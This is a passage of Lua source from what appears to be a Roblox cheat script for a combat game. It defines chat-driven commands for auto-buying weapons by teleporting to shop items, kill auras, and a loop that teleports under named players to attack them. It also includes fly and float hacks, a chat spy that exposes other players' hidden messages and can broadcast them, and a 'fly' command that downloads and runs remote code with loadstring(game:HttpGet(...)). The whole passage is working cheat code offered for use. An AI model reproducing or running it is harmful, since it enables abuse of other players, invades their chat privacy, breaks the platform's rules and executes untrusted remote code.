                                if v.Name == '[Grenade]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
        if CMD == 'mute' then
            if tostring(arguments[2]) == 'all' then
                muteingnew = true
                for _,v in pairs(Players:GetChildren()) do
                    if not table.find(muted, v.Name) then
                        table.insert(muted, v.Name)
                        print('muted ' .. v.Name)
                    end
                end
            else
                local plrtoview = arguments[2]
                if plrtoview then
                    local ptv = findPlayer(plrtoview)
                    if ptv then  
                        if not table.find(muted, ptv.Name) then
                            table.insert(muted, ptv.Name)
                            print('manualy muted ' .. ptv.Name)
                        end
                    end
                end
            end
        end
        
        coroutine.resume(coroutine.create(function()
            local function mute()
                for i,v in pairs(Players:GetChildren()) do
                    if table.find(muted, v.Name) then
                        if v.Character then
                            if v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND') and v.Character.UpperTorso:FindFirstChild('OriginalSize') then
                                v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND'):Stop()
                            end
                        end
                    end
                end
            end
            while wait(.2) do
                local success,err = pcall(mute)
            end
        end))
        
        if CMD == 'unmute' then
            if tostring(arguments[2]) == 'all' then
                muteingnew = false
                for _,v in pairs(Players:GetChildren()) do
                    if table.find(muted, v.Name) then
                        local removemute = table.find(muted, v.Name)
                        table.remove(muted, removemute)
                        print('unmuteed ' .. v.Name)
                    end
                end
            else
                local plrtoview = arguments[2]
                if plrtoview then
                    local ptv = findPlayer(plrtoview)
                    if ptv then  
                        if table.find(muted, ptv.Name) then
                            local removemute = table.find(muted, ptv.Name)
                            table.remove(muted, removemute)
                            print('unmuteed ' .. ptv.Name)
                        end
                    end
                end
            end
        end

        if CMD == 'buy' then
            local itemtobuy = nil
            local itemtobuyammofor = nil
            local ammomodel = nil
            local oldpos = player.Character.HumanoidRootPart.CFrame
            local Cash = player.DataFolder.Currency.Value
            for i,v in pairs(game:GetService('Workspace').Ignored.Shop:GetChildren()) do
                if itemtobuy == nil then
                    if string.find(string.lower(v.Name), arguments[2]) and not string.find(v.Name, 'Ammo') and itemtobuy == nil then
                        if arguments[2] == 'shotgun' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]
                        elseif arguments[2] == 'tacshotgun' or arguments[2] == 'tacticalshotgun' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1750"]
                        elseif arguments[2] == 'key' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Key] - $125"]
                        else
                            itemtobuy = v
                        end
                    end
                    if itemtobuy then
                        if string.find(itemtobuy.Name, 'Mask') then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $25"]
                        end
                        local pricesplit = string.split(itemtobuy.Name, '$')
                        local itemnamesplit = string.split(itemtobuy.Name, '-')
                        local price = tonumber(pricesplit[2])
                        local name = string.gsub(tostring(itemnamesplit[1]), " ", "")
                        print(name)
                        local function buygun()
                            wait()
                            Cash = player.DataFolder.Currency.Value
                            player.Character.HumanoidRootPart.CFrame = itemtobuy.Head.CFrame
                            fireclickdetector(itemtobuy.ClickDetector)
                        end
                        if name == '[MoneyGun]' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Money Gun]') or Cash < price
                        elseif name == '[Double' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Double-Barrel SG]') or Cash < price
                        elseif name == '[SurgeonMask]' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Surgeon Mask]') or Cash < price
                        elseif name ~= '[MediumArmor]' then
                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price
                        else
                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price or player.Character.BodyEffects.Armor.Value == 100
                        end
                        player.Character.HumanoidRootPart.CFrame = oldpos
                    end
                end
            end
        end
    end
player.Chatted:Connect(function(message,recipient)
    message = string.lower(message)
    local splitString = message:split(" ") -- Will Split String when space
    local slashCommand = splitString[1] 
    local cmd = slashCommand:split(prefix)	
    local cmdName = cmd[2]	
    if commands[cmdName] then
    	local arguments = {} 
    	for i = 2, #splitString, 1 do
    	   table.insert(arguments,splitString[i])			
    	end
    commands[cmdName](arguments)
    end
end)






	local Swagmode = game:GetService("CoreGui"):FindFirstChild("Swagmode")
	if Swagmode then
		Swagmode:Destroy()
	end


	local Swagmode = game:GetService("CoreGui"):FindFirstChild("Swagmode")
	if Swagmode then
		Swagmode:Destroy()
	end


peenesspesnispesnisbig = true
hostusername = hostusername
mimicing = false
        local Loop
        local loopFunction = function()
            local forbidden = {'[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
            local Found = false
            for _,v in pairs(game.Workspace.Players:GetChildren()) do
                if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= MaxDistance then
                    if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name and v.Name == hostusername then
                        Found = true
                        if mimicing == true then
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
end
                    end
                end
            end
            if Found == false then

                        if mimicing == true then
wait(0.4)
		local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
								localCharacter.Combat:Deactivate()
end            
end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until peenesspesnispesnisbig == false
        Pause()

	local Swagmode = game:GetService("CoreGui"):FindFirstChild("Swagmode")
	if Swagmode then
		Swagmode:Destroy()
	end


	local Swagmode = game:GetService("CoreGui"):FindFirstChild("Swagmode")
	if Swagmode then
		Swagmode:Destroy()
	end
end)
end)

auraing3 = false
AddCommand("aura3", {"ka3"}, "enables chatlogs", {}, function(Caller)
if standing == true then
oldposlol = _G.xpos
auraing3 = true
_G.ypos = 2
_G.zpos = -6

   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);

game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("following your lead!  ","All")
repeat
wait()

	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
if powerattack == false then

	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Deactivate()
end

wait(1)

until auraing3 == false



else
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("please summon me first  ","All")
end
end)


AddCommand("unaura3", {"unka3"}, "enables chatlogs", {}, function(Caller)
auraing3 = false
_G.xpos = oldposlol
_G.ypos = 5
_G.zpos = 2
end)


auraing2 = false
AddCommand("aura2", {"ka2"}, "enables chatlogs", {}, function(Caller)
auraing2 = true
standing2 = false


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end

repeat
wait()
ExecuteCommand("goto", {hostusername}, LocalPlayer);
ExecuteCommand("nokill", {hostusername}, LocalPlayer);

ExecuteCommand("goto", {"nearest"}, LocalPlayer);
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
if powerattack == false then

	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Deactivate()
end
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);

ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);
ExecuteCommand("goto", {hostusername}, LocalPlayer);





until auraing2 == false



end)



AddCommand("unaura2", {"unka2"}, "enables chatlogs", {}, function(Caller)
auraing2 = false
ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);
wait(0.5)
ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);

if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
standing2 = false
end
end)




AddCommand("aura", {"ka"}, "enables chatlogs", {}, function(Caller)
auraing = true
Players = game:GetService("Players")

IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
releaseDelay = 0.2
				local mouse = IYMouse
repeat
wait()
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
if powerattack == false then

	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Deactivate()
end
until auraing == false
end)

AddCommand("unaura", {"unka"}, "enables chatlogs", {}, function(Caller)
auraing = false
end)


AddCommand("equipknife", {}, "enables chatlogs", {}, function(Caller)
			local Player = game:GetService("Players").LocalPlayer
			local Mouse = Player:GetMouse()
			local SpeedGlitch = false
			local Wallet = Player.Backpack:FindFirstChild("[Knife]")

					SpeedGlitch = not SpeedGlitch
					if SpeedGlitch == true then
						Wallet.Parent = Player.Character
						wait(0.15)
						Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
						wait(0.05)
						repeat game:GetService("RunService").Heartbeat:wait()
							SpeedGlitch = false
							game:GetService("RunService").Heartbeat:wait()
						until SpeedGlitch == false
						end
end)


AddCommand("equipfist", {}, "enables chatlogs", {}, function(Caller)
			local Player = game:GetService("Players").LocalPlayer
			local Mouse = Player:GetMouse()
			local SpeedGlitch = false
			local Wallet = Player.Backpack:FindFirstChild("Combat")

					SpeedGlitch = not SpeedGlitch
					if SpeedGlitch == true then
						Wallet.Parent = Player.Character
						wait(0.15)
						Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
						wait(0.05)
						repeat game:GetService("RunService").Heartbeat:wait()
							SpeedGlitch = false
							game:GetService("RunService").Heartbeat:wait()
						until SpeedGlitch == false
						end
end)

AddCommand("setup1", {"getknife"}, "enables chatlogs", {}, function(Caller)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-278, 22, -235)
   wait(0.2)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
   
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-278, 22, -235)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
wait(0.3)

ExecuteCommand("equipknife", {}, LocalPlayer);
wait(0.1)
ExecuteCommand("reach", {}, LocalPlayer);
end)

AddCommand("circle", {"orb"}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)

    local Target = GetPlayer(Args[1])[1];
    if (Target == LocalPlayer) then
a = true
    end
    local Radius = tonumber(Args[3]) or 5
    local Speed = tonumber(Args[2]) or 7
    local random = random(tick() / 2, tick());
    local Root, TRoot = GetRoot(), GetRoot(Target);
    AddConnection(CConnect(Heartbeat, function()
        Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
    end), CEnv);
end)


AddCommand("uncircle", {"orb"}, "unorbits yourself from the other player", {}, function()
    if (not next(LoadCommand("circle").CmdEnv)) then
a = true
    end
    DisableAllCmdConnections("circle");
end)



AddCommand("chat", {"say"}, "sends a message", {"1"}, function(Caller, Args)
    local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
    local toChat = concat(Args, " ");
    ChatRemote.FireServer(ChatRemote, toChat, "All");
    return "chatted " .. toChat
end)


attackinglol = false
positionlol = 1
AddCommand("position", {"pos"}, "sends a message", {}, function(Caller)
positionlol = positionlol+1
if positionlol == 1 then
_G.xpos = -3
end
if positionlol == 2 then
_G.xpos = 0
end

if positionlol == 3 then
_G.xpos = 3
positionlol = 0
end
end)

_G.xpos = 3
_G.ypos = 5
_G.zpos = 2


AddCommand("stand", {}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);


ExecuteCommand("uncircle", {}, LocalPlayer);
if attackinglol == false then

	local Target = GetPlayer(Args[1])[1]
standuser = GetPlayer(Args[1])[1]
local standuser = GetPlayer(Args[1])[1]
wait(0.2)
if errored == false then
	undergroundtarget = GetPlayer(Args[1])[1]
	local Connection = CConnect(Heartbeat, function()
		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(_G.xpos, _G.ypos, _G.zpos);
	end)

	CEnv[Target.Name] = Connection
	AddPlayerConnection(LocalPlayer, Connection);
	AddConnection(Connection);
standing = true
ExecuteCommand("float", {}, LocalPlayer);
standing = true
end
end
end)



AddCommand("unstand", {}, "removes loop teleportation to the other character", {}, function(Caller)
attacking = false
            if attackunder == true then
                attackunder = false
                	local Looping = LoadCommand("underground").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("stand");
		plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
                else
	local Looping = LoadCommand("stand").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("stand");
	plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X9,Y9+26,Z9)
ExecuteCommand("unfloat", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
standing = false
end
end)







standing = false
errored = false


AddCommand("attack", {"kill"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
auraing3 = false
attackattempt = true
standing2 = false
wait(0.5)
if errored ~= true then

if attackinglol == false then
flying = false
attackinglol = true
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);

ExecuteCommand("uncircle", {}, LocalPlayer);


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end
attacking = true
	local Target = GetPlayer(Args[1])[1]
	undergroundtarget = GetPlayer(Args[1])[1]
wait(0.2)
if errored == false then

	local Connection = CConnect(Heartbeat, function()
		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, -6, 1);
	end)

	CEnv[Target.Name] = Connection
	AddPlayerConnection(LocalPlayer, Connection);
	AddConnection(Connection);


Players = game:GetService("Players")

IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
releaseDelay = 1.6

targetthatidkattack = undergroundtarget.Name

				local mouse = IYMouse
ExecuteCommand("float", {}, LocalPlayer);
attacks = 0
repeat
wait()
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
if powerattack == false then

	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Deactivate()
end
wait(0.5)
attacks = attacks+1
if attacks == 10 or game.Players[targetthatidkattack].Character.BodyEffects['K.O'].Value == true then
ExecuteCommand("unattack", {}, LocalPlayer);
end
until attacking == false

ExecuteCommand("unfloat", {}, LocalPlayer);
wait(0.6)

if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
end



else
errored = false
end
print("a")
end
else
errored = false
end
end)


AddCommand("chatlogs", {"clogs"}, "enables chatlogs", {}, function(Caller)
--This script reveals ALL hidden messages in the default chat

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)




AddCommand("unattack", {"unkill"}, "removes loop teleportation to the other character", {}, function(Caller)
if attackinglol == true then
ExecuteCommand("unfloat", {}, LocalPlayer);
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
end

attackinglol = false
attacking = false
            if attackunder == true then
                attackunder = false
                	local Looping = LoadCommand("underground").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("attack");
		plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
                else
	local Looping = LoadCommand("attack").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("attack");
	plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X9,Y9+26,Z9)
if standing == true then
a = true 
end
end
end
end)

AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local TweenService = Services.TweenService
	local Create = TweenService.Create
	for i, v in next, Target do
		local Tween = Create(TweenService, GetRoot(), TweenInfo.new(-1000), {CFrame = GetRoot(v).CFrame})
		Tween.Play(Tween);
	end
end)





AddCommand("fly", {}, "fly your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if flyonce == true then
		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
	else
		FLYSPEED = 20
		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
	end
end
end)





AddCommand("shazam", {}, "fly your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
FLYSPEED = 20

        local player = game.Players.LocalPlayer
        local Flyanimation = Instance.new('Animation', game.Workspace)
        Flyanimation.AnimationId = 'rbxassetid://3541044388'
        local Idleanimation = Instance.new('Animation', game.Workspace)
        Idleanimation.AnimationId = 'rbxassetid://3541114300'
        local HeroIdle = player.Character.Humanoid:LoadAnimation(Idleanimation)
        local HeroFly = player.Character.Humanoid:LoadAnimation(Flyanimation)
        Idleing2 = false
            local function flyanim()
                    --HeroIdle:Stop()
                    local FlyingA = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541044388' then
                            FlyingA = true
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788289281' then
                            v:Stop()
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788292075' then
                            v:Stop()
                        end
                    end
                    if FlyingA == false and Idleing2 == false then
                        HeroFly:Play()
                    end
            end
        
        local SPEED = FLYSPEED
        repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        repeat wait() until mouse
        local plr = game.Players.LocalPlayer
        local torso = plr.Character.Head
        flying = false
        local deb = true
        local ctrl = {f = 0, b = 0, l = 0, r = 0}
        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
        maxspeed = 5000
        speed = 5001
        function Fly()
            local bg = Instance.new("BodyGyro", torso)
            bg.P = 9e4
            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            bg.cframe = torso.CFrame
            local bv = Instance.new("BodyVelocity", torso)
            bv.velocity = Vector3.new(0,0.1,0)
            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            repeat wait()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
            if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
                speed = speed+.0+(speed/maxspeed)
                local foundidle = false
                flyanim()
            if speed > maxspeed then
        
                speed = maxspeed
        
            end
            elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
                speed = speed-5
                
            if speed > 5 then
                speed = -2
            end
            end
            if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
            elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
              
            else
                bv.velocity = Vector3.new(0,0.1,0)
        
        
            end
            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
            until not flying
            ctrl = {f = 0, b = 0, l = 0, r = 0}
            lastctrl = {f = 0, b = 0, l = 0, r = 0}
            speed = 5
            bg:Destroy()
            bv:Destroy()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
        end
        mouse.KeyDown:connect(function(key)
            if key:lower() == "x" then
                if flying then
                    flying = false
                    HeroFly:Stop()
                    HeroIdle:Stop()
            else
                flying = true
                Fly()
            end
        
            elseif key:lower() == "w" then
                ctrl.f = FLYSPEED
            elseif key:lower() == "s" then
                ctrl.b = -FLYSPEED
            elseif key:lower() == "a" then
                ctrl.l = -FLYSPEED
            elseif key:lower() == "d" then
                ctrl.r = FLYSPEED
            end
        end)
        mouse.KeyUp:connect(function(key)
            if key:lower() == "w" then
                ctrl.f = 0
            elseif key:lower() == "s" then
                ctrl.b = 0
            elseif key:lower() == "a" then
                ctrl.l = 0
            elseif key:lower() == "d" then
                ctrl.r = 0
            end
            if ctrl.r == 0 and ctrl.l == 0 and ctrl.b == 0 and ctrl.f == 0 then
                local Loop
                local loopFunction = function()
                    Idleing2 = true
                    HeroFly:Stop()
                    wait()
                    Idleing = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541114300' then
                            Idleing = true
                        end
                    end
                    if Idleing == false and flying == true then
                        HeroIdle:Play()
                    end
        
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Idleing2 = false
                end;
                Start()	
                repeat wait() until ctrl.r ~= 0 or ctrl.l ~= 0 or ctrl.b ~= 0 or ctrl.f ~= 0 or flying == false
                Pause()
            end
            end)
        Fly()
        player.CharacterAdded:Connect(function()
            repeat wait() until player.Character
            wait(1)
            Fly()
        end)
end
end)



AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not CEnv[1]) then
		local Part = InstanceNew("Part");
		Part.CFrame = CFrameNew(0, -10000, 0);
		Part.Size = Vector3New(2, .2, 1.5);
		Part.Material = "Grass"
		Part.Anchored = true
		Part.Transparency = 1
		ProtectInstance(Part);
		Part.Parent = Services.Workspace
		CEnv[2] = Part
		local R6 = isR6();
		local Root = GetRoot();
		AddConnection(CConnect(RenderStepped, function()
			if (CEnv[1] and Root) then
				Part.CFrame = Root.CFrame * CFrameNew(0, -3.1, 0);
			else
				Part.CFrame = CFrameNew(0, -10000, 0);
				Root = GetRoot();
			end
			if (Keys["Q"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, -1.5, 0);
			elseif (Keys["E"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, 1.5, 0);
			end
		end), CEnv)
	end
end
end)

AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Floating = LoadCommand("float").CmdEnv
	if (Floating[1]) then
		Disconnect(Floating[1]);
		Destroy(Floating[2]);
		LoadCommand("float").CmdEnv = {}
	end
end
end)


AddCommand("flyspeed", {}, "sets your fly speed", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local spedAmount = tonumber(Args[1]) or 70
	FLYSPEED = spedAmount
end
end)

AddCommand("fov", {}, "sets your fov", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Amount = tonumber(Args[1]) or 70
	SpoofProperty(Camera, "FieldOfView");
	Camera.FieldOfView = Amount
end
end)

AddCommand("forceresetp", {"frp"}, "sets your fov", {}, function(Caller, Args)
